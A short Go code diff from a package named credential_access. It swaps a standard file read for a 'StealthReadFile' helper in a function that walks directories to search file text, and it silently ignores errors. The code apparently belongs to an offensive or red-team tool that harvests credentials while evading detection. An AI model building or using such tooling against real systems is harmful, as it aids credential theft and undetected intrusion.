@@ -21,7 +21,6 @@ package credential_access
 
 import (
 	"fmt"
-	"io/ioutil"
 	"log"
 	"os"
 	"path/filepath"
@@ -67,7 +66,7 @@ func SearchLocalFileText(StartDir string) {
 		}
 
 		// read file text
-		data, err := ioutil.ReadFile(path)
+		data, err := util.StealthReadFile(path)
 		if err != nil {
 			//log.Fatal(err) //ignore fatal errors
 		}
